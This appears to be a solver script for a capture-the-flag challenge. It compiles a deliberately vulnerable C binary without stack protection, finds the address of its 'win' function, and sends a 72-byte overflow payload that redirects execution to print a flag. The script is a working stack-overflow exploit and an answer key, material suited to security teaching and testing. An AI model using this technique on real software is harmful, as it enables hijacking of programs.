#!/usr/bin/env python3
from __future__ import annotations

import re
import struct
import subprocess
import tempfile
from pathlib import Path


def main() -> None:
    root = Path(__file__).resolve().parents[1]
    source = root / 'docker' / 'src' / 'challenge.c'
    with tempfile.TemporaryDirectory() as tmp_dir:
        binary = Path(tmp_dir) / 'challenge.bin'
        subprocess.run(['gcc', '-O0', '-g', '-fno-stack-protector', '-no-pie', '-o', str(binary), str(source)], check=True)
        nm = subprocess.check_output(['nm', '-an', binary], text=True)
        win = int(next(line.split()[0] for line in nm.splitlines() if ' win' in line), 16)
        payload = b'A' * 72 + struct.pack('<Q', win)
        proc = subprocess.run([binary], input=payload, capture_output=True)
    text = proc.stdout.decode('utf-8', errors='ignore')
    match = re.search(r'flag\{[a-zA-Z0-9_\-]+\}', text)
    if not match:
        raise SystemExit('flag not found')
    print(match.group(0))


if __name__ == '__main__':
    main()
